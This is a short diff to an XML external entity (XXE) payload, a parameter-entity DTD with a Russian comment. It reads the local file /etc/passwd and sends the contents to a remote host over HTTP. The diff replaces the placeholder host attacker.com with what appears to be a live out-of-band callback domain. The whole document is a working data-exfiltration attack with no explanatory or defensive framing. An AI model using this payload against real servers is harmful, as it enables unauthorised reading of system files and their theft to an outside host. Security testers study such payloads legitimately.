@@ -1,4 +1,4 @@
 <!ENTITY % payload SYSTEM "file:///etc/passwd">  <!-- Чтение локального файла -->
-<!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%payload;'>">
+<!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://8ktjq0pkeqgf82wnb51f5awah1nsbj37s.c.p0w.pw/exfil?data=%payload;'>">
 %wrapper;
 %exfil;
